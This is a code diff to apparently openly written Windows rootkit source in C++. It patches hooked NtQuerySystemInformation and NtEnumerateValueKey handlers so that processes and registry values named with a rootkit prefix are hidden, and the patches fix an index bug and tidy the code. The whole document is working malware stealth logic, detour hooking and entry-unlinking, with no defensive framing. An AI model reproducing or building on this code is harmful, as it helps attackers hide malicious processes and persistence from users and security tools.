@@ -130,7 +130,7 @@ extern "C" NTSTATUS __declspec(dllexport) WINAPI qsi(SYSTEM_INFORMATION_CLASS sy
 				if (name.find(ROOTKIT_PREFIX) != std::wstring::npos)
 				{
 					previous_entry->NextEntryOffset += entry->NextEntryOffset;	// MAKE PREVIOUS ENTRY POINT TO THE NEXT ENTRY
-					ZeroMemory(entry, entry->NextEntryOffset);					// CLEAR OUR ENTRY, WHY NOT?
+					std::memset(entry, 0x00, entry->NextEntryOffset);			// CLEAR OUR ENTRY, WHY NOT?
 				}
 			}
 
@@ -322,6 +322,7 @@ extern "C" NTSTATUS __declspec(dllexport) NTAPI ntevk(HANDLE key_handle, ULONG i
 	detour::remove_detour(function_pointer, ntevk_og, sizeof(ntevk_og));
 
 	// WE NEED TO SAVE INDEXES NOT TO DISPLAY SAME KEY TWICE AFTER REPLACING THE HIDDEN ONES
+	// THESE ARE UNIQUE TO EACH THREAD TO PREVENT MULTI-THREAD ISSUES
 	thread_local int last_replaced = -1;
 	thread_local HANDLE last_handle = key_handle;
 
@@ -332,7 +333,7 @@ extern "C" NTSTATUS __declspec(dllexport) NTAPI ntevk(HANDLE key_handle, ULONG i
 	}
 	
 	// UPDATE THE INDEX TO BE AFTER THE VALUE WE REPLACED HIDDEN KEYS WITH
-	if(index < last_replaced)
+	if(index <= last_replaced)
 	{
 		index = last_replaced + 1;
 		++last_replaced;
@@ -356,15 +357,17 @@ extern "C" NTSTATUS __declspec(dllexport) NTAPI ntevk(HANDLE key_handle, ULONG i
 		if (key_value_class == KEY_VALUE_INFORMATION_CLASS::KeyValueFullInformation)
 		{
 			auto data = static_cast<KEY_VALUE_FULL_INFORMATION*>(key_value_info);
-			name	  = std::wstring(data->Name, data->NameLength / sizeof(wchar_t));
+			name = std::wstring(data->Name, data->NameLength / sizeof(wchar_t));
 		}
 		else if (key_value_class == KEY_VALUE_INFORMATION_CLASS::KeyValueBasicInformation)
 		{
 			auto data = static_cast<KEY_VALUE_BASIC_INFORMATION*>(key_value_info);
-			name 	  = std::wstring(data->Name, data->NameLength / sizeof(wchar_t));
+			name = std::wstring(data->Name, data->NameLength / sizeof(wchar_t));
 		}
 		else // PARTIAL INFORMATION DOESN'T CONTAIN THE NAME SO WE DONT REALLY CARE ABOUT IT
+		{
 			break;
+		}
 
 		// IF NOTHING IS FOUND WE BREAK OUT OF THE LOOP
 		if (name.find(ROOTKIT_PREFIX) == std::wstring::npos)
@@ -375,11 +378,11 @@ extern "C" NTSTATUS __declspec(dllexport) NTAPI ntevk(HANDLE key_handle, ULONG i
 		}
 
 		// ELSE CLEAR THE CURRENT HELD INFORMATION AND INCREASE THE INDEX TO CHECK NEXT VALUE
-		std::memset(key_value_info, 0, length);
+		std::memset(key_value_info, 0x00, length);
 		++index;			
 	}
 
-	// 'REHOOK
+	// REHOOK
 	detour::hook_function(function_pointer, reinterpret_cast<uintptr_t>(ntevk));
 
 	return result;
